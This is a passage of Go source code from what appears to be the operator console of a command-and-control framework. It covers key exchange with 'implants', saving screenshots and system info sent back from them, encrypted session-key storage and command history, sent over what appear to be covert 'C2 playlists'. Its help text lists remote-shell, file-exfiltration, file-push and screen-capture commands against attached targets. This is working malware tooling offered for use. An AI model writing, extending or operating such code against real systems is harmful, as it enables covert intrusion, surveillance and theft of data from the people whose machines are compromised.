	// Store as pending until implant confirms by sending a result we can decrypt
	op.pendingKeys[clientID] = sessionKey

	// Build keyexchange command. Must use master key since the implant
	// hasn't derived the session key yet.
	msg := protocol.NewC2Message("keyexchange", op.nextSeq)
	op.nextSeq++
	msg.PubKey = hex.EncodeToString(op.ephPub.Bytes())

	// Bind to this client's session
	if info, ok := op.connectedClients[clientID]; ok {
		msg.SessionID = info.SessionID
	}

	return &kxJob{clientID: clientID, msg: msg}
}

// sendKeyExchange transmits a prepared keyexchange command to the implant.
// Must NOT be called under op.mu (performs API calls).
func (op *Operator) sendKeyExchange(job *kxJob) {
	encoded, err := protocol.EncodeMessage(job.msg.ToCommandMap(), op.key)
	if err != nil {
		fmt.Printf("[!] Failed to send keyexchange to %s: %v\n", job.clientID[:8], err)
		return
	}

	ctx := context.Background()
	chunks, err := protocol.ChunkPayload(encoded, job.msg.Seq,
		protocol.ChannelCmd, op.key)
	if err != nil {
		return
	}
	if err := op.client.WriteC2Playlists(ctx, chunks); err != nil {
		fmt.Printf("[!] Failed to send keyexchange to %s: %v\n", job.clientID[:8], err)
		return
	}

	fmt.Printf("[*] Forward secrecy established with %s\n", job.clientID[:8])
}

func displayResult(seq int, result map[string]interface{}) {
	module, _ := result["module"].(string)
	status, _ := result["status"].(string)
	data, _ := result["data"].(string)

	fmt.Printf("\n--- Result seq=%d [%s] status=%s ---\n", seq, module, status)
	switch {
	case module == "screenshot" && status == "ok" && strings.HasPrefix(data, "b64:"):
		// Save to disk instead of flooding the console with base64
		if path, err := saveScreenshot(seq, data); err != nil {
			fmt.Printf("[!] Could not save screenshot: %v\n", err)
		} else {
			fmt.Printf("[*] Screenshot saved to %s\n", path)
		}
	case module == "sysinfo" && status == "ok":
		var info map[string]interface{}
		if json.Unmarshal([]byte(data), &info) == nil {
			for k, v := range info {
				fmt.Printf("  %s: %v\n", k, v)
			}
		} else {
			fmt.Println(data)
		}
	default:
		fmt.Println(data)
	}
	fmt.Println("---")
}

// saveScreenshot decodes a b64 screenshot result and writes it to disk.
func saveScreenshot(seq int, data string) (string, error) {
	raw, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(data, "b64:"))
	if err != nil {
		return "", err
	}
	path := fmt.Sprintf("screenshot-seq%d-%s.jpg", seq,
		time.Now().Format("20060102-150405"))
	if err := os.WriteFile(path, raw, 0600); err != nil {
		return "", err
	}
	return path, nil
}

func printHelp() {
	fmt.Println(`
Agent management:
  agents          List connected implants
  attach <id>     Attach to an agent (prefix match, e.g. 'attach 0f7b')
  detach          Detach from current agent

Commands (requires attached agent):
  ishell          Interactive remote shell (auto-detects bash/powershell)
  shell <cmd>     Execute a single shell command
  exfil <path>    Exfiltrate a file
  push <l> <r>    Push local file <l> to remote path <r>
  screenshot [n]  Capture the target's screen (display n, default 0)
  sysinfo         Gather system info

History:
  history         Show command history for current session
  result <seq>    Show result for a specific seq number

Other:
  results         Poll for pending results
  wait <seq>      Wait for a specific result
  status          Show agents and pending commands
  clean           Remove all C2 playlists
  help            Show this help
  quit / exit     Exit the console`)
}

// --- History ---

func (op *Operator) loadHistory() {
	data, err := os.ReadFile(op.historyFile)
	if err != nil {
		return
	}
	op.mu.Lock()
	defer op.mu.Unlock()
	_ = json.Unmarshal(data, &op.history)
	// Cap loaded history and build the seq index
	if len(op.history) > maxHistoryEntries {
		op.history = op.history[len(op.history)-maxHistoryEntries:]
	}
	op.rebuildHistoryIdxLocked()
}

// rebuildHistoryIdxLocked rebuilds the seq -> latest-entry index.
// Caller must hold op.mu.
func (op *Operator) rebuildHistoryIdxLocked() {
	op.historyIdx = make(map[int]int, len(op.history))
	for i, h := range op.history {
		op.historyIdx[h.Seq] = i
	}
}

// saveHistoryLocked marks history dirty and flushes to disk at most once
// per historySaveMinWait. Caller must hold op.mu.
func (op *Operator) saveHistoryLocked() {
	op.historyDirty = true
	if time.Since(op.lastHistorySave) < historySaveMinWait {
		return
	}
	op.flushHistoryLocked()
}

// flushHistoryLocked writes history to disk if dirty. Caller must hold op.mu.
func (op *Operator) flushHistoryLocked() {
	if !op.historyDirty {
		return
	}
	data, err := json.MarshalIndent(op.history, "", "  ")
	if err != nil {
		return
	}
	if err := os.WriteFile(op.historyFile, data, 0600); err != nil {
		return
	}
	op.historyDirty = false
	op.lastHistorySave = time.Now()
}

// FlushHistory forces a history save. Call on shutdown.
func (op *Operator) FlushHistory() {
	op.mu.Lock()
	defer op.mu.Unlock()
	op.flushHistoryLocked()
}

// WipeKeys zeroes all session and pending key bytes and clears the
// maps. Call on shutdown so forward-secrecy keys don't linger in the
// heap until GC.
func (op *Operator) WipeKeys() {
	op.mu.Lock()
	defer op.mu.Unlock()
	for cid, sk := range op.sessionKeys {
		zeroKey(sk)
		delete(op.sessionKeys, cid)
	}
	for cid, sk := range op.pendingKeys {
		zeroKey(sk)
		delete(op.pendingKeys, cid)
	}
}

// --- Session key persistence (opt-in) ---

// sessionStoreKey derives the encryption key for the on-disk session store.
func (op *Operator) sessionStoreKey() []byte {
	return crypto.ComputeHMACSHA256([]byte(op.key), []byte(shared.SessionStoreLabel()))
}

// loadSessionKeys restores persisted session keys from disk.
// Entries that fail to decrypt (wrong master key) are skipped.
func (op *Operator) loadSessionKeys() {
	data, err := os.ReadFile(op.sessionFile)
	if err != nil {
		return // no store yet
	}
	var stored map[string]string
	if err := json.Unmarshal(data, &stored); err != nil {
		return
	}

	storeKey := op.sessionStoreKey()
	restored := 0
	op.mu.Lock()
	defer op.mu.Unlock()
	for cid, encHex := range stored {
		raw, err := hex.DecodeString(encHex)
		if err != nil {
			continue
		}
		sk, err := crypto.DecryptFast(raw, storeKey)
		if err != nil || len(sk) != 32 {
			continue // wrong master key or corrupt entry
		}
		op.sessionKeys[cid] = sk
		restored++
	}
	if restored > 0 {
		fmt.Printf("[*] Restored %d persisted session key(s) from %s\n",
			restored, op.sessionFile)
	}
}

// saveSessionKeysLocked encrypts and writes the active session keys.
// No-op unless persistence is enabled. Caller must hold op.mu.
func (op *Operator) saveSessionKeysLocked() {
	if !op.persistSession {
		return
	}
	storeKey := op.sessionStoreKey()
	stored := make(map[string]string, len(op.sessionKeys))
	for cid, sk := range op.sessionKeys {
		enc, err := crypto.EncryptFast(sk, storeKey)
		if err != nil {
			continue
		}
		stored[cid] = hex.EncodeToString(enc)
	}
	data, err := json.Marshal(stored)
	if err != nil {
		return
	}
	_ = os.WriteFile(op.sessionFile, data, 0600)
}

// recordCommandLocked appends a command to history. Caller must hold op.mu.
func (op *Operator) recordCommandLocked(seq int, module, command string) {
	clientID := op.attachedClient
	sessionID := ""
	if info, ok := op.connectedClients[clientID]; ok {
		sessionID = info.SessionID
	}
	op.history = append(op.history, HistoryEntry{
		Seq:       seq,
		ClientID:  clientID,
		SessionID: sessionID,
		Module:    module,
		Command:   command,
		SentAt:    time.Now(),
	})
	op.historyIdx[seq] = len(op.history) - 1

	// Cap history size, rebuilding the index after a trim
	if len(op.history) > maxHistoryEntries {
		op.history = op.history[len(op.history)-maxHistoryEntries:]
		op.rebuildHistoryIdxLocked()
	}
	op.saveHistoryLocked()
}

// recordResultLocked records a result against its command. Caller must hold op.mu.
func (op *Operator) recordResultLocked(seq int, status, data string) {
	// Fast path: O(1) index lookup for the latest entry with this seq
	if idx, ok := op.historyIdx[seq]; ok && idx < len(op.history) {
		if op.history[idx].Status == "" {
			op.history[idx].Status = status
			op.history[idx].Result = data
			op.history[idx].RecvAt = time.Now()
			op.saveHistoryLocked()
			return
		}
	}
	// Fallback: linear scan (entry from a previous operator session)
	for i := len(op.history) - 1; i >= 0; i-- {
		if op.history[i].Seq == seq && op.history[i].Status == "" {
			op.history[i].Status = status
			op.history[i].Result = data
			op.history[i].RecvAt = time.Now()
			op.saveHistoryLocked()
			return
		}
	}
}

func (op *Operator) printHistory() {
	op.mu.RLock()
	defer op.mu.RUnlock()

	if len(op.history) == 0 {
		fmt.Println("[*] No command history")
		return
	}

	// Show last 20 entries
	start := 0
	if len(op.history) > 20 {
		start = len(op.history) - 20
	}

	fmt.Printf("\n  %-5s %-10s %-12s %-10s %-6s %s\n",
		"SEQ", "CLIENT", "SESSION", "MODULE", "STATUS", "COMMAND")
	fmt.Printf("  %-5s %-10s %-12s %-10s %-6s %s\n",
		"-----", "----------", "------------", "----------", "------",
		"--------------------")

	for _, h := range op.history[start:] {
		cid := h.ClientID
		if len(cid) > 8 {
			cid = cid[:8]
		}
		sid := h.SessionID
		if len(sid) > 10 {
			sid = sid[:10]
		}
		status := h.Status
		if status == "" {
			status = "\033[33mpending\033[0m"
		} else if status == "ok" {
			status = "\033[32mok\033[0m"
		} else if status == "lost" {
			status = "\033[90mlost\033[0m"
		} else {
			status = "\033[31m" + status + "\033[0m"
		}
		cmd := h.Command
		if len(cmd) > 40 {
			cmd = cmd[:37] + "..."
		}
		fmt.Printf("  %-5d %-10s %-12s %-10s %-6s %s\n",
			h.Seq, cid, sid, h.Module, status, cmd)
	}
	fmt.Println()
}

func (op *Operator) showResult(seqStr string) {
	seqNum, err := strconv.Atoi(seqStr)
	if err != nil {
		fmt.Println("[!] Usage: result <seq>")
		return
	}

	op.mu.RLock()
	defer op.mu.RUnlock()

	for i := len(op.history) - 1; i >= 0; i-- {
		if op.history[i].Seq == seqNum {
			h := op.history[i]
			fmt.Printf("\n--- seq=%d [%s] %s ---\n", h.Seq, h.Module, h.Command)
			fmt.Printf("  client  : %s\n", h.ClientID[:8])
			fmt.Printf("  sent    : %s\n", h.SentAt.Format("2006-01-02 15:04:05"))
			if h.Status != "" {
				fmt.Printf("  status  : %s\n", h.Status)
				fmt.Printf("  recv    : %s\n", h.RecvAt.Format("2006-01-02 15:04:05"))
				fmt.Printf("  latency : %s\n", h.RecvAt.Sub(h.SentAt).Truncate(time.Second))
				fmt.Println("  output  :")
				fmt.Println(h.Result)
			} else {
				fmt.Println("  status  : pending (no result yet)")
			}
			fmt.Println("---")
			return
		}
	}
	fmt.Printf("[!] No history for seq=%d\n", seqNum)
}
